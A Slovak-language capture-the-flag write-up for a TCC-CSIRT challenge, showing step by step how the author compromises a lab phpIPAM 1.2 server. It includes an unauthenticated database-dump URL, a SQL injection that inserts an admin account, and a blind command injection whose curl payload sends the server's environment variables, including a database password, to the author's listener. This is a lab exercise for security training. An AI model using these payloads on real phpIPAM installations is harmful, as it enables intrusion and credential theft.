# Zadanie #

> Hi, TCC-CSIRT analyst,
> 
> do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.
> 
> - The entry point to LORE is at [http://intro.lore.tcc](http://intro.lore.tcc "http://intro.lore.tcc").

> See you in the next incident!
> 
> **Hint1:**
> Be sure you enter flag for correct chapter.


----------

# Riešenie #

Na stránke intro máme 4 slajdy, každý pre kždú kapitolu. Každý obsahuje nejakú vetu, ktorá sa zdá byť nejakým dodatočným hintom

> [2 Origin](http://pimpam.lore.tcc/ "2 Origin")
> 
> An ink on blue,
> Revealing sources of olden days,
> Very silent whisper.
> 
> Not assigned, but findable,
> The passage for anyone,
> Shall ease the mind.

Navštívime stránku http://pimpam.lore.tcc/, kde vidíme phpIPAM admin panel login stránku, kde sa mi v čase keď som na stránku dostal prvýkrát podarilo prihlásiť údajmi Admin:ipamadmin, ale ako píšem tento writeup, tak už to možné nie je. Každopádne, ide o nástroj managovania ip adries a tento máme vo verzii 1.2, ktorá je známa zraniteľnosťami ako path traveral ako v úlohe 1, ale aj sql injection a XSS.. Stačí pogoogliť a vieme pomerne rýchlo nájsť zraniteľné endpointy. Napríklad sem - `https://www.exploit-db.com/exploits/40338`

Aby sme vedeli využiť sql inject, bolo by vhodné vedieť ako vyzerá databáza, prípadne sú rozna nástroje ako SQLMAP, ktoré dokážu s týmto pomôcť. Mne to pomohlo len nájsť endpoint, o ktorom som už vedel z webu, ale zbežnou statickou analýzou zdrojáku tejto verzie phpIPAM vidím, že je možne aj neautentikovaému používateľovi stiahniť dump  databázy.

    http://pimpam.lore.tcc/app/admin/import-export/generate-mysql.php

Tu už vidíme celú schému a skúsime si injektnuť používateľa, pričom použijem hash default hesla

    http://pimpam.lore.tcc/?page=tools&section=changelog&subnetId=a&sPage=50; INSERT INTO users VALUES (123,'blablabla',1,'$6$rounds=3000$JQEE6dL9NpvjeFs4$RK5X3oa28.Uzt/h5VAfdrsvlVe.7HgQUYKMXTJUsud8dmWfPzZQPbRbk8xJn1Kyyt4.dWm4nJIYhAV2mbOZ3g.','','Administrator','phpIPAM Admin','admin@domain.local','No','0','statistics;favourite_subnets;changelog;access_logs;error_logs;top10_hosts_v4',9,'6;6;','No','No','No','2024-10-17 18:35:14','2024-10-17 18:07:34','2024-10-17 18:35:14','default',0,30,NULL,NULL)

Prihlásim sa dnu ako blablabla:ipamadmin

Tu som sa poskúšal všetko možné aj nemožné, skúšal som pomocou sql injectu, či sa mi nepodarí stiahnuť alebo uložiť súbor cez DB, ale používateľ pimpam tejto databázy má veľmi osekané možnosti a nie je to len databázou. Rovnako som skúsil aj path traversal vulnerabilitu na endpointe súvisiacom so subnet import (.../ripe-import/import-subnets.php) , ale ako sa ukázalo, dokonca aj ako sa pokúšal zapnúť API, php na serveri má zakázané curl. Takže path traversal nám nepomôže.

Po dlhom čase ničneobjavenia sa mi podarilo vygoogliť ešte jednu zraniteľnosť, blind command injection

    http://archive.justanotherhacker.com/2016/09/jahx163_-_phpipam_multiple_vulnerabilities.html

a toto už bolo skutočne užitočné. Endpoint `http://pimpam.lore.tcc/app/subnets/scan/subnet-scan-telnet.php` je podľa statickej analýzy schopný vykonať ľubovoľný príkaz, ktorého výstup síce nedokažem jednoducho printuť, pretože vykonaním môjho príkazu zlomím vykonávanie daného php scriptu a skočím do chyby 500, ale to mi nevadí, pretože si možem akýkoľvek príkaz poslať cez curl (vypnutý bol len cez php, ale nie v shell) pokiaľ mi bude bežať jednoduchý python http server..

U seba teda pustím v prvom terminal okne

    python3 -m http.server 8888                                                                             Serving HTTP on :: port 8888 (http://[::]:8888/) ... 

na pimpam injectnem command v druhom terminal okne (po skúsenosti s predošlej úlohy sa budem priamo sústreniť na premenné a nie súbory ako také)

    curl "http://pimpam.lore.tcc/app/subnets/scan/subnet-scan-telnet.php" -X POST --data "port=80&debug=1&subnetId=4;curl 10.200.0.13:8888/?flag=$(cat /proc/self/environ | tr -d \'\\n\');" 

a na prvom terminal okne sa mi objaví 

    ::ffff:10.99.24.81 - - [31/Oct/2024 16:38:17] "GET /?KUBERNETES_SERVICE_PORT=443KUBERNETES_PORT=tcp://192.168.128.1:443PIMPAM_DB_PORT=tcp://192.168.167.76:3306PIMPAM_DB_SERVICE_PORT=3306PIMPAM_DB_PORT_3306_TCP=tcp://192.168.167.76:3306HOSTNAME=pimpam-5858b674c9-vd6x8PIMPAM_WEB_SERVICE_HOST=192.168.200.130OLDPWD=/PIMPAM_DBPASS=2eb6a09ff7b8417c4344c8bde185a512APACHE_RUN_DIR=/var/run/apache2APACHE_PID_FILE=/var/run/apache2/apache2.pidPIMPAM_WEB_SERVICE_PORT=80PIMPAM_WEB_PORT=tcp://192.168.200.130:80PIMPAM_DBHOST=pimpam-dbPIMPAM_WEB_SERVICE_PORT_WEB=80PIMPAM_WEB_PORT_80_TCP_ADDR=192.168.200.130KUBERNETES_PORT_443_TCP_ADDR=192.168.128.1PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPIMPAM_WEB_PORT_80_TCP_PORT=80PIMPAM_WEB_PORT_80_TCP_PROTO=tcpKUBERNETES_PORT_443_TCP_PORT=443APACHE_LOCK_DIR=/var/lock/apache2KUBERNETES_PORT_443_TCP_PROTO=tcpLANG=CPIMPAM_DBNAME=pimpamAPACHE_RUN_USER=www-dataAPACHE_RUN_GROUP=www-dataAPACHE_SERVER_NAME=localhostAPACHE_LOG_DIR=/var/log/apache2PIMPAM_DB_PORT_3306_TCP_ADDR=192.168.167.76PIMPAM_WEB_PORT_80_TCP=tcp://192.168.200.130:80KUBERNETES_PORT_443_TCP=tcp://192.168.128.1:443KUBERNETES_SERVICE_PORT_HTTPS=443PIMPAM_DB_PORT_3306_TCP_PORT=3306KUBERNETES_SERVICE_HOST=192.168.128.1PWD=/var/www/html/app/subnets/scanPIMPAM_DB_PORT_3306_TCP_PROTO=tcpPIMPAM_DB_SERVICE_HOST=192.168.167.76PIMPAM_DB_SERVICE_PORT_MYSQL=3306FLAG=FLAGV51j-9ETA-Swya-8cOR HTTP/1.1" 200 -

pretty print

    KUBERNETES_SERVICE_PORT=443
	KUBERNETES_PORT=tcp://192.168.128.1:443
	PIMPAM_DB_PORT=tcp://192.168.167.76:3306
	PIMPAM_DB_SERVICE_PORT=3306
	PIMPAM_DB_PORT_3306_TCP=tcp://192.168.167.76:3306
	HOSTNAME=pimpam-5858b674c9-vd6x8
	PIMPAM_WEB_SERVICE_HOST=192.168.200.130
	OLDPWD=/
	PIMPAM_DBPASS=2eb6a09ff7b8417c4344c8bde185a512
	APACHE_RUN_DIR=/var/run/apache2
	APACHE_PID_FILE=/var/run/apache2/apache2.pid
	PIMPAM_WEB_SERVICE_PORT=80
	PIMPAM_WEB_PORT=tcp://192.168.200.130:80
	PIMPAM_DBHOST=pimpam-db
	PIMPAM_WEB_SERVICE_PORT_WEB=80
	PIMPAM_WEB_PORT_80_TCP_ADDR=192.168.200.130
	KUBERNETES_PORT_443_TCP_ADDR=192.168.128.1
	PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
	PIMPAM_WEB_PORT_80_TCP_PORT=80
	PIMPAM_WEB_PORT_80_TCP_PROTO=tcp
	KUBERNETES_PORT_443_TCP_PORT=443
	APACHE_LOCK_DIR=/var/lock/apache2
	KUBERNETES_PORT_443_TCP_PROTO=tcp
	LANG=C
	PIMPAM_DBNAME=pimpam
	APACHE_RUN_USER=www-data
	APACHE_RUN_GROUP=www-data
	APACHE_SERVER_NAME=localhost
	APACHE_LOG_DIR=/var/log/apache2
	PIMPAM_DB_PORT_3306_TCP_ADDR=192.168.167.76
	PIMPAM_WEB_PORT_80_TCP=tcp://192.168.200.130:80
	KUBERNETES_PORT_443_TCP=tcp://192.168.128.1:443
	KUBERNETES_SERVICE_PORT_HTTPS=443
	PIMPAM_DB_PORT_3306_TCP_PORT=3306
	KUBERNETES_SERVICE_HOST=192.168.128.1
	PWD=/var/www/html/app/subnets/scan
	PIMPAM_DB_PORT_3306_TCP_PROTO=tcp
	PIMPAM_DB_SERVICE_HOST=192.168.167.76
	PIMPAM_DB_SERVICE_PORT_MYSQL=3306
	FLAG=FLAG{V51j-9ETA-Swya-8cOR}


Na konci vidíme vlajku

----------

## Vlajka ##
    FLAG{V51j-9ETA-Swya-8cOR}